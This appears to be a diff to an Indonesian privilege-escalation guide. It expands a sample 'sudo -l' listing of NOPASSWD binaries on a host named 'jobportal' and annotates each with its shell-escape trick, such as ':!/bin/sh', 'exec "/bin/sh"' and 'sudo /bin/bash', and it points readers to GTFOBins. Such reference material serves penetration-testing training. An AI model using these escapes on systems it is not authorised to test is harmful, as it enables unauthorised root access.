@@ -42,10 +42,33 @@ Matching Defaults entries for www-data on jobportal:
     env_reset, mail_badpass, secure_path=/usr/sbin\:/usr/bin\:/sbin\:/bin
 
 User www-data may run the following commands on jobportal:
-    (root) NOPASSWD: /usr/bin/vim          ← RENTAN! vim bisa shell escape
-    (root) NOPASSWD: /usr/bin/find         ← RENTAN! find bisa -exec shell
-    (root) NOPASSWD: /usr/bin/python3      ← RENTAN! python3 bisa setuid(0)
+
+# --- shell langsung ---
+    (root) NOPASSWD: /usr/bin/bash        ← RENTAN! langsung root shell
+    (root) NOPASSWD: /usr/bin/sh          ← RENTAN! langsung root shell
+    (root) NOPASSWD: /usr/bin/zsh         ← RENTAN! langsung root shell
+    (root) NOPASSWD: /usr/bin/env         ← RENTAN! env /bin/sh
+
+# --- editor & pager (shell escape) ---
+    (root) NOPASSWD: /usr/bin/vim         ← RENTAN! :!/bin/sh
+    (root) NOPASSWD: /usr/bin/less        ← RENTAN! !/bin/sh
+    (root) NOPASSWD: /usr/bin/more        ← RENTAN! !/bin/sh
+    (root) NOPASSWD: /usr/bin/man         ← RENTAN! man membuka pager
+    (root) NOPASSWD: /usr/bin/journalctl  ← RENTAN! output dibuka via pager
+
+# --- interpreter (spawn shell via script) ---
+    (root) NOPASSWD: /usr/bin/python3     ← RENTAN! setuid(0) + exec shell
+    (root) NOPASSWD: /usr/bin/perl       ← RENTAN! exec "/bin/sh"
+    (root) NOPASSWD: /usr/bin/ruby       ← RENTAN! exec "/bin/sh"
+    (root) NOPASSWD: /usr/bin/node        ← RENTAN! spawn("/bin/sh")
+    (root) NOPASSWD: /usr/bin/php         ← RENTAN! exec shell via script
+    (root) NOPASSWD: /usr/bin/lua         ← RENTAN! os.execute("/bin/sh")
+    (root) NOPASSWD: /usr/bin/awk         ← RENTAN! system("/bin/sh")
 ```
+
+> **Varian paling parah:** `(root) NOPASSWD: ALL` — user boleh menjalankan **semua command** sebagai root, cukup `sudo /bin/bash` untuk root shell langsung.
+
+> **Catatan:** Daftar di atas difokuskan hanya ke binary yang **langsung memberi shell**. Binary lain seperti `cp`, `tee`, `tar`, `zip`, `wget`, `curl`, `find`, `ftp`, `git`, `docker` tetap bisa diabuse — daftar lengkapnya di GTFOBins → bagian **Sudo**. Cukup **satu** entry RENTAN untuk mendapatkan root shell.
 
 Oneliner gabungan — cek SUID, sudo, dan capabilities **sekaligus** dalam satu command:
 
